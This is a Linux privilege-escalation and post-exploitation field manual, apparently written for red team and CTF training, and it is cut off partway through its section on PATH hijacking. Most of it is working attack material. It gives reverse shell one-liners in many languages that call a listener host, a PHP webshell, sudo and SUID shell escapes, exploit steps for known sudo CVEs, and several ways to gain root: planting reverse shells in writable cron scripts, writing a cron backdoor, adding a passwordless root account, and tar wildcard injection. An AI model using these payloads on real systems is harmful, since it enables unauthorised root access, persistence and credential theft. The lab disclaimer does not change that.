# Linux Privilege Escalation & Post-Exploitation — Red Team Field Manual
### SUID/SGID | Sudo | Cron | Capabilities | Kernel Exploits | Container Escape | Full Post-Ex

> **Series Position:** Module 7
> Cross-references: `Ports_Protocols_RedTeam_Field_Manual.md` (SSH port 22, initial shell access), `Web_Application_Security_RedTeam_Field_Manual.md` (web shell → Linux foothold), `Active_Directory_RedTeam_Field_Manual.md` (Linux machines in AD environments).
>
> **Red Team Lens:** You have a low-priv shell. Now what? PrivEsc is the phase that separates operators from script kiddies. Real engagements are won in post-exploitation — what you do AFTER you get in. This module covers both: how to get root, and what to do when you have it.
>
> **Lab Disclaimer:** All techniques are for authorized environments — your own VMs, HTB, THM, PG Practice, OSCP labs, TryHackMe.

---

## Table of Contents

### PART 1 — POST-EXPLOITATION MINDSET
1. [The First 60 Seconds After Shell Landing](#1-the-first-60-seconds-after-shell-landing)
2. [Shell Stabilization — Making Your Shell Usable](#2-shell-stabilization)
3. [Situational Awareness — Full System Enumeration](#3-situational-awareness)

### PART 2 — AUTOMATED ENUMERATION TOOLS
4. [LinPEAS — The Gold Standard](#4-linpeas)
5. [LinEnum, Linux Smart Enumeration (lse.sh)](#5-linenum--lse)
6. [Reading Automated Tool Output — What Matters](#6-reading-automated-tool-output)

### PART 3 — PRIVILEGE ESCALATION VECTORS
7. [Sudo Misconfigurations — The Most Common Path](#7-sudo-misconfigurations)
8. [SUID / SGID Binaries — Elevated Execution](#8-suid--sgid-binaries)
9. [Cron Jobs & Scheduled Tasks](#9-cron-jobs--scheduled-tasks)
10. [Writable Files & Path Hijacking](#10-writable-files--path-hijacking)
11. [Linux Capabilities](#11-linux-capabilities)
12. [Weak File Permissions — passwd, shadow, sudoers](#12-weak-file-permissions)
13. [NFS No_Root_Squash](#13-nfs-no_root_squash)
14. [Kernel Exploits](#14-kernel-exploits)
15. [Docker Group & Container Escape (Host PrivEsc)](#15-docker-group--container-escape)
16. [LXC/LXD Group Abuse](#16-lxclxd-group-abuse)
17. [Wildcard Injection](#17-wildcard-injection)
18. [LD_PRELOAD & LD_LIBRARY_PATH Hijacking](#18-ld_preload--ld_library_path-hijacking)
19. [Writable /etc/passwd](#19-writable-etcpasswd)
20. [Abusing Services — Systemd Unit File Injection](#20-abusing-services)
21. [Environment Variable Abuse](#21-environment-variable-abuse)
22. [Python / Pip Library Hijacking](#22-python--pip-library-hijacking)
23. [SSH Key Abuse](#23-ssh-key-abuse)

### PART 4 — CREDENTIAL HUNTING
24. [Where Credentials Live on Linux](#24-where-credentials-live-on-linux)
25. [Browser Credential Extraction](#25-browser-credential-extraction)
26. [Memory Credential Extraction](#26-memory-credential-extraction)

### PART 5 — CONTAINER SECURITY
27. [Docker Escape Techniques — All Vectors](#27-docker-escape-techniques)
28. [Kubernetes Pod Escape](#28-kubernetes-pod-escape)

### PART 6 — LATERAL MOVEMENT FROM LINUX
29. [SSH Agent Hijacking](#29-ssh-agent-hijacking)
30. [Kerberos from Linux — Linux in AD Environments](#30-kerberos-from-linux)

### PART 7 — PERSISTENCE ON LINUX
31. [Linux Persistence Mechanisms](#31-linux-persistence-mechanisms)

### PART 8 — COVERING TRACKS
32. [Log Manipulation & Anti-Forensics](#32-log-manipulation--anti-forensics)

### PART 9 — FULL PRIVESC CHAINS
33. [Full Lab: Web Shell → Root Chain](#33-full-lab-web-shell--root-chain)

---

# PART 1 — POST-EXPLOITATION MINDSET

---

## 1. The First 60 Seconds After Shell Landing

### Layman's Terms
You just got a shell. Your instinct says "run all the things!" — resist it. The first 60 seconds should be **silent observation**. Understand where you landed before making noise. You need to answer: Who am I? Where am I? What is this machine? What can I touch? Who else is here?

### Real-World Event
In the **Target breach (2013)**, attackers used a third-party HVAC vendor's compromised credentials as initial access. They had shell access to network machines for **weeks before moving to payment systems**. The patience during post-exploitation phase is what made the breach so catastrophic — they mapped everything before acting.

### The First 60 Seconds Checklist

```bash
# ══════════════════════════════════════════════════════════════════
# GOLDEN RULE: Run these commands in THIS ORDER.
# Don't skip ahead. Don't start PrivEsc tools yet.
# Context first, exploitation second.
# ══════════════════════════════════════════════════════════════════

# 1. WHO AM I? (5 seconds)
id
# Expected: uid=33(www-data) gid=33(www-data) groups=33(www-data)
# uid=0 = already root, skip PrivEsc
# Note: group membership matters (docker, lxd, disk, sudo, adm)

whoami && id && groups
# groups output is critical — memberships determine PrivEsc paths!

# 2. WHERE AM I? (5 seconds)
hostname && uname -a && cat /etc/os-release
# Expected:
# ubuntu-web01
# Linux ubuntu-web01 5.4.0-150-generic #167-Ubuntu SMP x86_64 GNU/Linux
# Ubuntu 20.04.5 LTS
# Kernel version → check for kernel exploits (DirtyPipe, DirtyCow etc.)

# 3. WHAT IP DO I HAVE? (5 seconds)
ip a 2>/dev/null || ifconfig 2>/dev/null
# Expected:
# eth0: inet 10.10.10.50/24
# Look for: multiple interfaces (pivot opportunity!)
#           Internal IP ranges you can pivot into

# 4. WHO ELSE IS HERE? (5 seconds)
w && who && last | head -10
# Expected:
# alice pts/0 10.10.10.100  Mon Jan 16 03:14  ← active SSH session from alice!
# root  pts/1 10.10.10.1    Mon Jan 16 02:00  ← root is logged in!

# 5. WHAT USERS EXIST? (5 seconds)
cat /etc/passwd | grep -v "nologin\|false" | cut -d: -f1,3,6
# Expected: only show interactive users (UID >= 1000 typically)
# root:0:/root
# alice:1000:/home/alice
# bob:1001:/home/bob

# 6. WHAT CAN I SUDO? (5 seconds — FIRST privesc check)
sudo -l
# Expected outputs and their meaning:
# (ALL : ALL) ALL          → FULL sudo = instant root: sudo su
# (root) NOPASSWD: /bin/vi → vi as root = instant root: sudo vi → :!bash
# (root) /usr/bin/python3  → python3 as root = instant root: sudo python3 -c 'import os;os.system("bash")'
# Sorry, user www-data may not run sudo  → move to next check

# 7. NETWORK CONNECTIONS — what's listening? what's connected? (10 seconds)
ss -tlnp 2>/dev/null || netstat -tlnp 2>/dev/null
# Expected — look for:
# 127.0.0.1:3306  ← MySQL only on localhost (could be accessible to us!)
# 127.0.0.1:6379  ← Redis with no auth (privesc via Redis)
# 0.0.0.0:8080    ← Internal app exposed

# Active connections:
ss -tnp 2>/dev/null | grep ESTABLISHED

# 8. WHAT PROCESSES ARE RUNNING? (10 seconds)
ps aux --no-headers | grep -v "\[" | awk '{print $1,$11,$12}' | sort -u | head -30
# Key things to spot:
# - Processes running as root (target these)
# - Database servers (MySQL, Redis, MongoDB)
# - Web servers (might have config files with creds)
# - Backup software (often runs as root with file access)
# - Custom scripts (often vulnerable)

# 9. WHAT'S MOUNTED? (5 seconds)
mount | grep -v "proc\|sys\|dev\|run\|cgroup\|tmpfs" | column -t
# Expected:
# /dev/sda1  on  /         type  ext4   (rw,relatime)
# 192.168.1.10:/data on /mnt/nfs type nfs  ← NFS mount! Check no_root_squash
# /dev/sdb1  on  /backup   type  ext4   ← Backup partition! Config files here?

# 10. INTERESTING ENVIRONMENT VARIABLES (5 seconds)
env 2>/dev/null | grep -i "pass\|key\|secret\|token\|api\|db\|aws\|azure" 
# Expected findings:
# DB_PASSWORD=SuperSecret123
# AWS_SECRET_ACCESS_KEY=wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY
# API_TOKEN=sk-prod-abcdef123456
# Credentials in environment variables is extremely common!
```

---

## 2. Shell Stabilization

### Layman's Terms
A raw netcat reverse shell is like having a phone connection with terrible audio — it works but barely. You can't use Ctrl+C without killing your shell, can't use arrow keys, can't run interactive programs (vi, su, mysql). **Shell stabilization turns your primitive connection into a full interactive terminal.**

### Why Stabilization Matters

```
UNSTABILIZED SHELL PROBLEMS:
  ✗ Ctrl+C kills your shell (not just the running program)
  ✗ No tab completion
  ✗ Arrow keys print escape sequences instead of navigating history
  ✗ Ctrl+Z puts shell in background, losing it
  ✗ Cannot run interactive programs (su, vim, top, mysql)
  ✗ No job control
  ✗ Terminal size wrong (breaks output from many programs)
  ✗ SIGINT propagates to YOUR terminal
  
STABILIZED SHELL:
  ✓ Ctrl+C kills running program, shell stays alive
  ✓ Tab completion works
  ✓ Arrow keys navigate history
  ✓ Full interactive programs work
  ✓ Correct terminal dimensions
```

### Stabilization Methods

```bash
# ══════════════════════════════════════════════════════════════════
# METHOD 1: Python PTY (most reliable — Python almost always present)
# ══════════════════════════════════════════════════════════════════

# Step 1: In your netcat shell — spawn PTY:
python3 -c 'import pty; pty.spawn("/bin/bash")'
# OR if only python2:
python -c 'import pty; pty.spawn("/bin/bash")'
# Expected: prompt changes to: www-data@ubuntu-web01:/var/www/html$

# Step 2: Background the shell:
# Press: Ctrl+Z
# Expected: [1]+ Stopped  nc -lvnp 4444

# Step 3: Fix your LOCAL terminal:
stty raw -echo; fg
# raw = pass special chars (Ctrl+C, etc.) directly to remote
# -echo = don't echo locally (prevents double chars)
# fg = bring shell back to foreground
# NOTE: Your terminal might look weird — that's normal

# Step 4: Set terminal type and size:
export TERM=xterm
# Get your LOCAL terminal size (run in separate terminal):
#   stty size  → e.g., "50 210"
stty rows 50 cols 210

# DONE — you now have a fully interactive shell!
# Test: Ctrl+C in shell (kills running command, not shell)
# Test: arrow up (shows command history)

# ══════════════════════════════════════════════════════════════════
# METHOD 2: script command
# ══════════════════════════════════════════════════════════════════
script /dev/null -c bash
# Creates a pseudo-terminal via script utility
# Then: Ctrl+Z → stty raw -echo; fg → export TERM=xterm

# ══════════════════════════════════════════════════════════════════
# METHOD 3: socat (best quality — requires socat on target)
# ══════════════════════════════════════════════════════════════════
# On attacker (listener):
socat file:`tty`,raw,echo=0 tcp-listen:4444
# On target (connect back):
socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:10.10.10.50:4444
# Instantly gives fully interactive shell with correct terminal size

# ══════════════════════════════════════════════════════════════════
# METHOD 4: Upgrade to SSH (if you have write access)
# ══════════════════════════════════════════════════════════════════
# Generate key pair on attacker:
ssh-keygen -t ed25519 -f /tmp/shell_key -N ""
cat /tmp/shell_key.pub  # Copy this

# In your shell (as target user):
mkdir -p ~/.ssh && chmod 700 ~/.ssh
echo "ssh-ed25519 AAAAC3Nz... attacker" >> ~/.ssh/authorized_keys
chmod 600 ~/.ssh/authorized_keys

# SSH in from attacker:
ssh -i /tmp/shell_key www-data@10.10.10.100
# Full SSH session — best possible shell quality

# ══════════════════════════════════════════════════════════════════
# REVERSE SHELL ONE-LINERS (for initial shell before stabilization)
# ══════════════════════════════════════════════════════════════════
# Attacker listener: nc -lvnp 4444

# Bash:
bash -i >& /dev/tcp/10.10.10.50/4444 0>&1

# Bash (URL-safe version for web parameter injection):
bash+-c+'bash+-i+>%26+/dev/tcp/10.10.10.50/4444+0>%261'

# Python3:
python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect(("10.10.10.50",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/bash","-i"])'

# Perl:
perl -e 'use Socket;$i="10.10.10.50";$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));connect(S,sockaddr_in($p,inet_aton($i)));open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/bash -i");'

# PHP:
php -r '$sock=fsockopen("10.10.10.50",4444);exec("/bin/bash -i <&3 >&3 2>&3");'

# PHP (one-liner webshell):
<?php system($_GET['cmd']); ?>

# Ruby:
ruby -rsocket -e 'exit if fork;c=TCPSocket.new("10.10.10.50","4444");while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end'

# Netcat (with -e, older versions):
nc -e /bin/bash 10.10.10.50 4444

# Netcat (without -e, most common):
rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/bash -i 2>&1 | nc 10.10.10.50 4444 >/tmp/f

# PowerShell (Windows):
powershell -NoP -NonI -W Hidden -Exec Bypass -Command "IEX(New-Object Net.WebClient).DownloadString('http://10.10.10.50/ps_shell.ps1')"

# RevShells generator: https://www.revshells.com/
```

---

## 3. Situational Awareness — Full System Enumeration

```bash
# ══════════════════════════════════════════════════════════════════
# COMPREHENSIVE ENUMERATION — run AFTER stabilization
# ══════════════════════════════════════════════════════════════════

# ── SYSTEM INFORMATION ────────────────────────────────────────────
uname -a                   # Kernel version (key for kernel exploits)
cat /etc/os-release        # Distro and version
cat /proc/version          # Kernel compile info
cat /proc/cpuinfo | head   # CPU architecture
lscpu | grep -E "Architecture|CPU"

# ── USERS & GROUPS ────────────────────────────────────────────────
cat /etc/passwd            # All accounts
cat /etc/group             # All groups — look for interesting ones!
cat /etc/shadow 2>/dev/null # Hashed passwords (readable if root or misc)

# High-value group membership check:
id; groups
# docker = instant root (see Section 15)
# lxd = instant root (see Section 16)
# disk = can read raw disk (read /etc/shadow!)
# adm = can read /var/log/* (find creds in logs)
# sudo = check sudo -l
# video = can take screenshots
# shadow = can read /etc/shadow directly!

# Enumerate home directories:
ls -la /home/
ls -la /root/ 2>/dev/null   # May be readable if misconfigured
find /home -name "*.txt" -o -name "*.sh" -o -name "id_rsa" 2>/dev/null

# ── INTERESTING FILES ─────────────────────────────────────────────
# Config files with credentials:
find / -name "*.conf" -readable 2>/dev/null | xargs grep -l "password\|passwd\|secret\|key" 2>/dev/null | head -20
find / -name "*.config" -readable 2>/dev/null | head -20
find / -name "wp-config.php" 2>/dev/null   # WordPress DB creds
find / -name "config.php" 2>/dev/null       # Generic PHP configs
find / -name ".env" 2>/dev/null             # dotenv files (app secrets)
find / -name "*.bak" -o -name "*.old" -o -name "*.backup" 2>/dev/null | head -10

# SSH keys:
find / -name "id_rsa" -o -name "id_dsa" -o -name "id_ed25519" 2>/dev/null
find / -name "authorized_keys" 2>/dev/null
find / -name "known_hosts" 2>/dev/null

# History files (often contain credentials used in commands):
cat ~/.bash_history 2>/dev/null
cat ~/.zsh_history 2>/dev/null
find /home /root -name ".*_history" 2>/dev/null | xargs cat 2>/dev/null
# Expected jackpots:
# mysql -u root -pSuperSecret123
# curl -u admin:password http://internal-api
# scp user:password@server:/file .

# ── NETWORK ───────────────────────────────────────────────────────
# Internal network map:
ip a; ip route; cat /etc/hosts; arp -a 2>/dev/null

# /etc/hosts — internal hostnames (infrastructure map!):
cat /etc/hosts
# Expected:
# 10.10.10.1   dc01.corp.local   dc01
# 10.10.10.2   fileserver.corp.local
# 10.10.10.100 web01.corp.local   web01

# What's listening (internal services we can reach):
ss -tlnp 2>/dev/null
# Expected:
# 127.0.0.1:3306  ← MySQL only on localhost — we can connect!
# 127.0.0.1:6379  ← Redis on localhost
# 127.0.0.1:8500  ← Consul
# 0.0.0.0:22      ← SSH

# ── INSTALLED SOFTWARE ────────────────────────────────────────────
dpkg -l 2>/dev/null | grep -i "mysql\|apache\|nginx\|redis\|docker\|python\|php"
rpm -qa 2>/dev/null | head -20
# Look for: old versions with known CVEs

# ── RUNNING PROCESSES (as root) ───────────────────────────────────
ps aux | grep "^root" | grep -v "\["
# Expected interesting processes:
# root  1234  /usr/sbin/cron            ← cron running as root (check jobs!)
# root  2345  /usr/bin/python3 /opt/backup/backup.py  ← script running as root!
# root  3456  /usr/sbin/mysqld          ← MySQL as root (bad practice)
```

---

# PART 2 — AUTOMATED ENUMERATION TOOLS

---

## 4. LinPEAS — The Gold Standard

### Layman's Terms
LinPEAS is an automated script that checks **hundreds of privilege escalation vectors** in one run. It color-codes output: **red/yellow = likely vulnerable, green = possibly interesting, everything else = noise**. The operator's job is to read its output intelligently — not just dump everything into a document.

```bash
# ── DELIVERY METHODS ──────────────────────────────────────────────

# Method 1: Download directly to target (if internet access):
curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh

# Method 2: Host on your attacker and serve to target:
# On Kali:
cp /usr/share/peass/linpeas/linpeas.sh /tmp/
python3 -m http.server 8080

# On target:
curl http://10.10.10.50:8080/linpeas.sh | bash
# OR: wget http://10.10.10.50:8080/linpeas.sh -O /tmp/lp.sh && bash /tmp/lp.sh

# Method 3: No internet — transfer via netcat:
# On Kali: nc -q 5 -lvnp 4444 < linpeas.sh
# On target: nc 10.10.10.50 4444 | bash

# Method 4: SCP (if SSH access):
scp linpeas.sh user@10.10.10.100:/tmp/linpeas.sh

# ── RUNNING OPTIONS ───────────────────────────────────────────────
# Full run (default):
bash linpeas.sh 2>/dev/null | tee /tmp/linpeas_output.txt

# Fast run (only high-probability findings):
bash linpeas.sh -q 2>/dev/null

# Specific check category:
bash linpeas.sh -s   # Superfast, quiet, no colors (for parsing)

# With colors for viewing in terminal:
bash linpeas.sh 2>/dev/null | less -R  # -R preserves colors

# ── READING LINPEAS OUTPUT ────────────────────────────────────────

# COLOR GUIDE (critical to understand):
# RED/YELLOW = HIGH probability vector: investigate immediately
# GREEN = INTERESTING: look at these second
# BLUE = INFO: low priority
# Default = noise: skip unless nothing else found

# SECTIONS TO ALWAYS CHECK FIRST:
# 1. "Sudo version" → check for CVEs (sudo < 1.9.5p2 = CVE-2021-3156)
# 2. "SUID" section → binaries with SUID set
# 3. "Cron jobs" section → scripts writable by us?
# 4. "Interesting Files" → configs with passwords
# 5. "Active Ports" → internal services we can access
# 6. "Processes" → root processes running our scripts?
# 7. "Network" → pivot opportunities

# EXAMPLE HIGH-VALUE LINPEAS FINDING:
# [+] SUID - Check easy privesc, exploits and write perms
# -rwsr-xr-x 1 root root 44K May  7 2022 /usr/bin/find  ← find has SUID!
#                                                         instant root!
```

---

## 5. LinEnum & lse.sh

```bash
# LinEnum — comprehensive but older:
curl https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh | bash

# linux-smart-enumeration (lse.sh) — better signal/noise ratio:
curl "https://github.com/diego-treitos/linux-smart-enumeration/releases/latest/download/lse.sh" -Lo /tmp/lse.sh
bash /tmp/lse.sh -l 1    # Level 1: most interesting findings only
bash /tmp/lse.sh -l 2    # Level 2: more findings
bash /tmp/lse.sh -l 3    # Level 3: everything

# lse.sh output is cleaner than LinPEAS — better for beginners:
# [!] cve-2021-3156     yes!  Sudo Baron Samedit (CVSS 7.8)
# [!] sudo              yes!  User www-data may run sudo on this host

# pspy — monitor processes WITHOUT root (find hidden cron jobs):
# Download: https://github.com/DominicBreuker/pspy/releases
./pspy64 -pf -i 1000    # Watch processes + filesystem events, 1s interval
# Run for 1-2 minutes — wait for cron to fire
# Expected:
# 2024/01/16 03:15:01 CMD: UID=0    PID=12345  | /bin/bash /opt/scripts/backup.sh
# ↑ Root running backup.sh every minute — investigate that script!
```

---

# PART 3 — PRIVILEGE ESCALATION VECTORS

---

## 7. Sudo Misconfigurations — The Most Common Path

### Layman's Terms
`sudo` lets users run specific commands as root. **Most Linux PrivEsc starts with `sudo -l`** — if you can run anything as root (especially interpreters, editors, or programs that spawn shells), it's instant root. This is by far the most common PrivEsc vector in CTFs and real engagements.

### Real-World Event
In **2021, CVE-2021-3156 (Baron Samedit)** — a heap overflow in sudo affecting versions < 1.9.5p2 — was exploitable on any Unix system with sudo installed, regardless of sudoers config. It took 10 years to find. Every Linux system needed patching within days. Sudo is so fundamental to Linux that vulnerabilities in it are immediately critical.

```bash
# STEP 1: Check what you can run as sudo:
sudo -l
# Expected outputs — each requires different approach:

# CASE 1: Full sudo
# (ALL : ALL) ALL   OR   (root) ALL
sudo su          # Instant root
sudo bash        # Instant root
sudo /bin/bash   # Instant root

# CASE 2: Specific binary (no password)
# (root) NOPASSWD: /usr/bin/vim
sudo vim -c ':!/bin/bash'    # vim → shell
# Expected: root shell spawned!

# (root) NOPASSWD: /usr/bin/python3
sudo python3 -c 'import os; os.system("/bin/bash")'

# (root) NOPASSWD: /usr/bin/find
sudo find / -exec /bin/bash \;

# (root) NOPASSWD: /usr/bin/less
sudo less /etc/passwd
# In less: !bash   → root shell

# (root) NOPASSWD: /usr/bin/nano
sudo nano
# Ctrl+R then Ctrl+X → execute command: reset; sh 1>&0 2>&0

# (root) NOPASSWD: /usr/bin/man
sudo man man
# In man viewer: !bash

# (root) NOPASSWD: /usr/bin/awk
sudo awk 'BEGIN {system("/bin/bash")}'

# (root) NOPASSWD: /usr/bin/nmap (older versions)
sudo nmap --interactive   # Enter: !sh → root shell
# Newer nmap: echo "os.execute('/bin/bash')" > /tmp/shell.nse; sudo nmap --script /tmp/shell.nse

# (root) NOPASSWD: /usr/bin/perl
sudo perl -e 'exec "/bin/bash";'

# (root) NOPASSWD: /usr/bin/ruby
sudo ruby -e 'exec "/bin/bash"'

# (root) NOPASSWD: /usr/bin/lua
sudo lua -e 'os.execute("/bin/bash")'

# REFERENCE: GTFOBins — https://gtfobins.github.io/
# Every binary + how to abuse it under sudo, SUID, shell escape etc.
# EVERY operator has this bookmarked.

# ── SUDO VERSION EXPLOITS ──────────────────────────────────────────
sudo --version
# Check against:
# CVE-2021-3156 (Baron Samedit): sudo < 1.9.5p2
# CVE-2019-14287: sudo < 1.8.28 → run as any user: sudo -u#-1 /bin/bash
# CVE-2019-18634 (pwfeedback): sudo < 1.8.26

# CVE-2019-14287 exploit (if sudo version < 1.8.28):
# In sudoers: (ALL, !root) NOPASSWD: /bin/bash
# Normally: can't run as root (excluded)
# Exploit: sudo -u#-1 /bin/bash   (UID -1 treated as 0 = root!)
sudo -u#-1 /bin/bash
# Expected if vulnerable: root shell!

# CVE-2021-3156 (Baron Samedit) — affects sudo < 1.9.5p2:
# Heap overflow in sudoedit argument parsing
# ANY local user → root, even without sudoers entry!
git clone https://github.com/blasty/CVE-2021-3156
cd CVE-2021-3156 && make
./sudo-hax-me-a-sandwich    # Auto-detects and exploits
# Expected: root shell

# ── SUDO RULE PARSING TRICKS ──────────────────────────────────────
# Wildcard in sudo rule:
# (root) NOPASSWD: /opt/scripts/backup*.sh
# We can: sudo /opt/scripts/backup../../../../bin/bash

# Writable script allowed in sudo:
# (root) NOPASSWD: /opt/scripts/backup.sh
# If WE can write to /opt/scripts/backup.sh:
echo "bash -i >& /dev/tcp/10.10.10.50/4444 0>&1" >> /opt/scripts/backup.sh
sudo /opt/scripts/backup.sh   # Shell as root!
```

---

## 8. SUID / SGID Binaries — Elevated Execution

### Layman's Terms
A SUID (Set User ID) binary **runs as its OWNER, not as the person who runs it**. If `/usr/bin/find` has SUID set and is owned by root, every time YOU run it, it runs WITH ROOT PRIVILEGES. That's a direct path to root if the binary can be abused to execute commands.

### Formal Definition
SUID (Set User ID bit) is a Unix permission bit that causes a program to be executed with the privileges of the file's owner rather than the user running it. SGID (Set Group ID) does the same but for group. Represented by `s` in `ls -la`: `-rwsr-xr-x` (SUID), `-rwxr-sr-x` (SGID).

```bash
# FIND ALL SUID BINARIES:
find / -perm -u=s -type f 2>/dev/null
# OR equivalently:
find / -perm -4000 -type f 2>/dev/null

# Expected output (some are normal, some are gold):
# /usr/bin/passwd          ← Normal — users need this to change passwords
# /usr/bin/sudo            ← Normal
# /usr/bin/mount           ← Normal
# /usr/bin/find            ← ABNORMAL — find with SUID = instant root!
# /usr/bin/vim.basic       ← ABNORMAL — vim with SUID = instant root!
# /usr/local/bin/custom    ← ABNORMAL — custom binary = investigate!

# FIND SGID BINARIES:
find / -perm -g=s -type f 2>/dev/null

# ── COMMON EXPLOITABLE SUID BINARIES ──────────────────────────────

# find (SUID):
/usr/bin/find . -exec /bin/bash -p \;
# -p = privileged mode (keeps EUID = root)
# Expected: bash-5.0# whoami → root

# bash itself with SUID (rare but happens):
bash -p
# Expected: bash-5.0# (root shell)

# vim (SUID):
vim -c ':py3 import os; os.execl("/bin/sh", "sh", "-pc", "reset; exec sh -p")'
# OR: vim -c ':!bash -p'

# python (SUID):
python3 -c 'import os; os.execl("/bin/bash", "bash", "-p")'

# perl (SUID):
perl -e 'exec "/bin/bash -p"'

# cp (SUID) — copy files as root:
# Can copy /etc/shadow to readable location
cp /etc/shadow /tmp/shadow_copy

# OR: replace /etc/passwd with one we control:
# Create user with no password:
echo "hacker::0:0::/root:/bin/bash" >> /etc/passwd
su hacker    # No password needed — UID 0!

# less (SUID):
less /etc/shadow
# In less: !bash -p → root shell!

# nmap (SUID) — older versions:
nmap --interactive
# In nmap shell: !sh → root

# dd (SUID) — read/write arbitrary files:
# Read shadow:
dd if=/etc/shadow 2>/dev/null
# Write to /etc/cron.d/:
echo "* * * * * root bash -i >& /dev/tcp/10.10.10.50/4444 0>&1" | \
  dd of=/etc/cron.d/backdoor

# base64 (SUID) — read arbitrary files:
base64 /etc/shadow | base64 -d

# ── CUSTOM SUID BINARIES ──────────────────────────────────────────
# If you find an unknown SUID binary, analyze it:
file /usr/local/bin/custom          # What type of file
strings /usr/local/bin/custom       # Look for interesting strings
ltrace /usr/local/bin/custom 2>&1   # Library calls
strace /usr/local/bin/custom 2>&1   # System calls
/usr/local/bin/custom               # Just run it and see
# Look for: calls to system(), popen(), exec() with user input
# Look for: relative paths in strings → PATH hijacking!

# ── GTFOBINS REFERENCE ────────────────────────────────────────────
# https://gtfobins.github.io/
# Search any binary → shows SUID, sudo, shell escape, file read/write techniques
# BOOKMARK THIS. Run it alongside every enumeration.
```

---

## 9. Cron Jobs & Scheduled Tasks

### Layman's Terms
Cron jobs are **scheduled tasks that run automatically at specified times**, often as root. If a cron job runs a script that WE can modify, or if it references a binary we can replace, we wait for it to run and our code executes as root. This is one of the most reliable PrivEsc paths because it's time-based — not dependent on an interactive session.

```bash
# ── FIND CRON JOBS ────────────────────────────────────────────────
# System-wide cron files:
cat /etc/crontab              # Main crontab
ls -la /etc/cron.*            # Cron directories
cat /etc/cron.d/*             # Additional cron files
cat /var/spool/cron/crontabs/* 2>/dev/null  # User crontabs

# Expected /etc/crontab:
# * * * * *   root  /opt/scripts/backup.sh          ← runs every minute as root!
# 0 */6 * * * root  /usr/local/bin/cleanup.py       ← runs every 6 hours as root!
# */5 * * * * www-data /home/www-data/run_app.sh     ← runs every 5 min as www-data

# Check what we can write (THE KEY CHECK):
ls -la /opt/scripts/backup.sh
# Expected VULNERABLE: -rwxrwxrwx root root /opt/scripts/backup.sh
# World-writable cron script = instant root next time it runs!

# ── EXPLOIT WRITABLE CRON SCRIPT ──────────────────────────────────
# SCENARIO: /etc/crontab has:
# * * * * * root /opt/scripts/backup.sh
# And /opt/scripts/backup.sh is world-writable

# Append reverse shell to the script:
echo "bash -i >& /dev/tcp/10.10.10.50/4444 0>&1" >> /opt/scripts/backup.sh
# Set up listener: nc -lvnp 4444
# Wait up to 60 seconds...
# Expected: root shell arrives!

# More reliable (append, don't overwrite — keeps cron job working):
echo '#!/bin/bash' > /opt/scripts/backup.sh  # Only if safe to overwrite
echo 'cp /bin/bash /tmp/bash_suid && chmod +s /tmp/bash_suid' >> /opt/scripts/backup.sh
# Wait for cron to run → /tmp/bash_suid appears with SUID root
/tmp/bash_suid -p    # Root shell!
# Benefit: persistent (SUID stays even after cron modifies the script)

# ── MONITOR CRON WITH PSPY ────────────────────────────────────────
# pspy watches process spawning without root:
./pspy64 -pf -i 500   # 500ms interval, watch files too
# Expected after waiting 1-2 minutes:
# 2024/01/16 03:15:01 CMD: UID=0 PID=1234 | /bin/bash /opt/scripts/backup.sh
# Now you know: backup.sh runs every minute as root (UID=0)

# ── PATH HIJACKING IN CRON SCRIPTS ────────────────────────────────
# SCENARIO: cron script contains:
# #!/bin/bash
# cd /tmp && tar czf backup.tar.gz /var/www  ← uses relative path for tar!

# If PATH in cron doesn't include safe dirs, or if cron modifies PATH:
# Check the script for relative binary calls (no full path):
cat /opt/scripts/backup.sh | grep -v "^#\|^$"
# Expected vulnerable line: 
# tar czf /backup/$(date +%F).tar.gz /var/www/html
# tar called without full path → we can hijack it!

# Step 1: Check cron's PATH (or assume /usr/local/bin is before /usr/bin):
# In crontab: PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin

# Step 2: Create malicious 'tar' in a directory in PATH before real tar:
echo '#!/bin/bash' > /usr/local/bin/tar
echo 'bash -i >& /dev/tcp/10.10.10.50/4444 0>&1' >> /usr/local/bin/tar
chmod +x /usr/local/bin/tar
# Wait for cron... → root shell!

# ── CRON WILDCARD INJECTION ───────────────────────────────────────
# SCENARIO: cron job runs:
# * * * * * root cd /var/www/html && tar czf /backup/web.tar.gz *
# The * is expanded by bash BEFORE passing to tar
# We can create files whose names are tar options!

cd /var/www/html
echo "" > "--checkpoint=1"
echo "" > "--checkpoint-action=exec=bash shell.sh"
echo "bash -i >& /dev/tcp/10.10.10.50/4444 0>&1" > shell.sh
chmod +x shell.sh
# When tar runs with *: it expands to include --checkpoint=1 and --checkpoint-action=exec=bash shell.sh
# tar executes shell.sh as root → root shell!
```

---

## 10. Writable Files & Path Hijacking

```bash
# ── FIND WORLD-WRITABLE FILES ────────────────────────────────────
# World-writable files (anyone can modify):
find / -writable -type f 2>/dev/null | grep -v "/proc\|/dev\|/sys" | head -20

# World-writable directories:
find / -writable -type d 2>/dev/null | grep -v "/proc\|/dev\|/sys\|/tmp\|/run" | head -20

# Files writable by OUR group:
find / -group $(id -gn) -writable 2>/dev/null | grep -v proc | head -20

# CRITICAL files to check for writability:
ls -la /etc/passwd       # World-writable = add root user (Section 19)
ls -la /etc/shadow       # Writable = change any password
ls -la /etc/sudoers      # Writable = give yourself sudo
ls -la /etc/cron*        # Writable = add cron job as root
ls -la /etc/ld.so.conf.d # Writable = library path injection (Section 18)

# ── PATH HIJACKING ────────────────────────────────────────────────
# SCENARIO: SUID binary or sudo-allowed script calls a program
# using just its name (not full path): e.g., calls "service" not "/usr/sbin/service"

# Step 1: Find the call in the binary:
strings /usr/local/bin/suid_binary | grep -v "^/"
# Expected:
# service apache2 restart    ← calls 'service' without full path!
# logger                     ← calls 'logger' without full path!

# Step 2: Check current PATH:
echo $PATH
# /usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin

# Step 3: Is any PATH directory writable by us?
for dir in $(echo $PATH | tr ':' ' '); do
